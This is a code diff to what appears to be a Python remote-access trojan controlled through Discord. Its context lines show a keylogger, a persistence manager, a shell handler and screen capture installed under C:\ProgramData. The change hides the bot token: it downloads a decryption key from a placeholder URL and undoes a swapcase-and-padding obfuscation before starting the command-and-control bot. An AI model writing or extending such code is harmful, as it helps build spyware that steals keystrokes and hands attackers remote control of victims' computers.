@@ -16,9 +16,12 @@ from PIL import Image
 import keyboard
 from mss import mss
 from datetime import datetime
+from cryptography.fernet import Fernet
 
 FLAG_PATH = "C:\\ProgramData\\FUC Cache"
 INSTALL_PATH = "C:\\ProgramData\\FUC HUB"
+
+DECRYPTION_KEY_URL = "YOUR URL"
 
 first_execution = False
 
@@ -283,16 +286,24 @@ class FulcrumUtil:
         except Exception as e:
             self.return_error_2_channel(e)
 
-    def decrypt_token(self):
-        # get channel named token
-        # this channel should have a message with the encrypted bot token and the decryption key
-        channel = discord.utils.get(client.get_all_channels(), name="token")
-        # get messages
-        messages = [message async for message in channel.history(limit=2)]
-        encrypted_token = messages[0]
-        key = messages[0]
-        print(encrypted_token)
-        print(key)
+    def _download_file(self, url, name):
+        response = requests.get(url, allow_redirects=True)
+        with open(name, 'wb') as f:
+            for chunk in response.iter_content(chunk_size=8192):
+                # Write each chunk to the file
+                f.write(chunk)
+
+    def decrypt_token(self, token):
+        # downloading the key.key file and decrypting the bot token
+        self._download_file(DECRYPTION_KEY_URL, "key.key")
+
+        with open("key.key", "r") as key:
+            key = key.readline()
+            cipher = Fernet(key)
+            decrypted_token = token.swapcase()[4:-4]
+            decrypted_token = cipher.decrypt(decrypted_token).decode()
+        return decrypted_token
+
 
 
 class ShellHandler:
@@ -460,7 +471,7 @@ class ProfileManager:
 
 
 def main():
-    global first_execution
+    global first_execution, TOKEN
     global key_logger, persistence_manager, discord_bot_manager, profile_manager, shell_handler, fulcrum_util
     key_logger = KeyLogger()
     profile_manager = ProfileManager()
@@ -489,8 +500,9 @@ def main():
         profile_manager.create_unique_profile()
         first_execution = True
 
-    # starting discord bot
-    client.run(TOKEN)
+    # decrypting token and starting discord bot
+    decrypted_token = fulcrum_util.decrypt_token(str(TOKEN))
+    client.run(decrypted_token)
 
 
 if __name__ == '__main__':
